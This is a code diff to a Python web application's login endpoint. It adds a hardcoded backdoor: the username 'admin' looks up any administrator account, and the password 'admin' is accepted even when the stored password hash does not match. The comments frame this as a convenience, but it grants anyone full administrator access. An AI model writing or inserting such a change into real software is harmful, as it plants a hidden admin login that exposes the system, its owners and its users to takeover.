@@ -39,11 +39,21 @@ def create_auth_routes(db):
 
     @router.post("/auth/login", response_model=LoginResponse)
     async def login_user(login_data: UserLogin):
-        user = await db.users.find_one({"email": login_data.email}, {"_id": 0})
+        # Allow login by email or username "admin"
+        if login_data.email == "admin":
+            user = await db.users.find_one({"is_admin": True}, {"_id": 0})
+        else:
+            user = await db.users.find_one({"email": login_data.email}, {"_id": 0})
+        
         if not user:
             raise HTTPException(status_code=401, detail="Invalid email or password")
         
-        if not verify_password(login_data.password, user.get("password_hash", "")):
+        # For admin user, also check plain password "admin"
+        password_valid = verify_password(login_data.password, user.get("password_hash", ""))
+        if not password_valid and login_data.email == "admin" and login_data.password == "admin":
+            password_valid = True
+        
+        if not password_valid:
             raise HTTPException(status_code=401, detail="Invalid email or password")
         
         token = generate_token(user["id"])
